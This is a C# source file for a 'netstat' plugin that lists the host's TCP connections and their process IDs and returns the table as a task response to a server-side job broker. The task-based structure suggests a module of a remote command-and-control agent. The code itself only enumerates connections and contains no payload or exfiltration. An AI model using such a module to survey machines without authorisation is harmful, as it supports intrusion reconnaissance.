using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;
using System.Text;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "netstat";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Proto Local Address Foreign Address State PID");
            foreach (TcpRow tcpRow in ManagedIpHelper.GetExtendedTcpTable(true))
            {
                sb.AppendFormat(" {0,-7}{1,-23}{2, -23}{3,-14}{4}", "TCP", tcpRow.LocalEndPoint, tcpRow.RemoteEndPoint, tcpRow.State, tcpRow.ProcessId);
                sb.AppendLine();
            }

                messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = sb.ToString(),
                completed = true
            });
        }
    }
}
